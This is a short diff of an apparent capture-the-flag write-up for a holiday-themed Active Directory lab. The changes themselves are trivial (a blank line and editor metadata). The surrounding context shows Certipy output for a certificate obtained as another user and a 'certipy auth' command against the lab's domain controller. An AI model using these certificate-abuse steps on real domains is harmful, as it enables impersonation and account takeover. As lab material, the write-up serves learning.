@@ -236,6 +236,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got certificate with UPN 'wombleycube@northpole.local'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'wombleycube.pfx'
+
 alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -287,6 +288,6 @@ And he'll silently take his way.
 
 **Achievement: AD**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNzgyMzcwNjg0LDExNjQzMzMxNzAsMTA4Nz
-g1MzE0NywtMjAxMDE5MjYzXX0=
+eyJoaXN0b3J5IjpbLTIwMDAyNzg2NzgsMTE2NDMzMzE3MCwxMD
+g3ODUzMTQ3LC0yMDEwMTkyNjNdfQ==
 -->
